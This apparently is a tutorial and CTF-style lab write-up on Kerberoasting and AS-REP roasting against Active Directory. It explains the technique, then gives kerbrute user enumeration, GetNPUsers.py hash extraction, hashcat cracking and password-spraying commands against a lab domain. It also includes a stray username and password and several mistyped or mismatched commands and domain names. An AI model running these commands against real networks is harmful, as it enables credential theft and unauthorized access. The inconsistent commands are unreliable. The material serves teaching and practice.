Kerberoasting is a post-exploitation attack technique that attempts to obtain a password hash of an Active Directory account that has a Service Principal Name (“SPN”).

# How do Kerberoasting attacks work?
Kerberoasting attacks exploit a combination of weak encryption techniques and simple or low-complexity passwords. These attacks typically follow the below process:

1. A threat actor compromises the account of a Domain User.
2. The threat actor uses the Domain User context to  request a Kerberos service ticket from the ticket granting service (TGS) using tools like GhostPack’s Rubeus or SecureAuth Corporation’s GetUserSPNs.py.
username: Olivia
password: ichliebedich
3. The threat actor receives a ticket from the Kerberos key distribution center (KDC). The ticket is encrypted with a hashed version of the account’s password.
4. The threat actor captures the TGS ticket and takes it offline.
5. The threat actor attempts to crack the SPN credential hash to obtain the service account’s plaintext password using brute force techniques or tools like Hashcat or JohnTheRipper.
6. With the service account password in hand, the threat actor attempts to authenticate as  the service account and is granted access to any service, network or system associated with the compromised account.
7. The attacker is then able to steal data, escalate privileges or set backdoors on the network to ensure future access.

# A few things to keep in mind:
->Kerberoasting attacks do not require a Domain Admin account or an account that has elevated privileges. In fact, any Domain User account can be used in this attack type since any account can request service tickets from the TGS.
->Kerberoasting requires the adversary to have existing access to a user account in order to request tickets from the KDC. This access can be achieved from a variety of methods, such as social engineering, malware or even purchasing user credentials on the dark web.
->The SPN can be linked to either a host-based or domain user account. Host-based SPNs are not vulnerable to Kerberoasting attacks because the password is a long, complex key that is refreshed every 30 days or less. These complex, random passwords are difficult to crack even with advanced cracking tools and brute force techniques. User account SPN passwords, on the other hand, are selected by humans and therefore often subject to the same vulnerabilities of any other manually created passwords. This is to say that the SPN password may be considered weak, common, outdated, recycled or reused. Advanced tools can often crack these passwords in a matter of hours.
->Kerberoasting attacks also exploit an architecture flaw, in that any authenticated domain user can initiate a TGS request for any service on the network. The domain controller that is the recipient of the request typically does not check to see if the user is authorized to access this service. The service itself enforces access rights, which creates a loophole by which an offline attack can occur.

# Nmap sample scan result

    389/tcp   open     ldap           Microsoft Windows Active Directory LDAP (Domain: administrator.htb0., Site: Default-First-Site-Name)
    
    3268/tcp  open     ldap           Microsoft Windows Active Directory LDAP (Domain: administrator.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC01.jab.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:DC01.jab.htb
| Not valid before: 2023-11-01T20:16:18
|_Not valid after:  2024-10-31T20:16:18
|_ssl-date: 2024-04-18T

Let’s start enumerate the kerberos users and see if we can find something: this time lets use Kerbrute (https://github.com/ropnop/kerbrute)

You can find the list i used here: (https://github.com/insidetrust/statistically-likely-usernames)


    ./kerbrute_linux_amd64 userenum --dc <commonName> -d <domainName> -v /path/to/wordlist   | kerbrute.outdated

To filter for valid usernames
    
    cat kerbrute.out | grep '+' | awk '{print$7}' > usernames.txt


Now we have a list of valid Users but no passwords.

Let's try an ASRep Roasting attack, attempting to exploit the lack of pre-authentication for some accounts, we can try to intercept some hashes.

    cat usernames.txt | head

    GetNPUsers.py jab.htb -userfile uernames.txt -format hascat -outputfile hashes_roast.txt

To get any pre-authenticated users with their hash

    cat hashes_roast.txt
    
Crach the hshes using hashcat

    hashcat hashes_roast.txt /path/to/wordlist --show
    
We have now a clear password for jmontgomery@jab.htb, and we can check if it works and has been reused: let’s spay the password for all the users

    ./kerbrute_linux_amd64 passwordspray --dc <commonName> -d <domainName> username.txt <password>
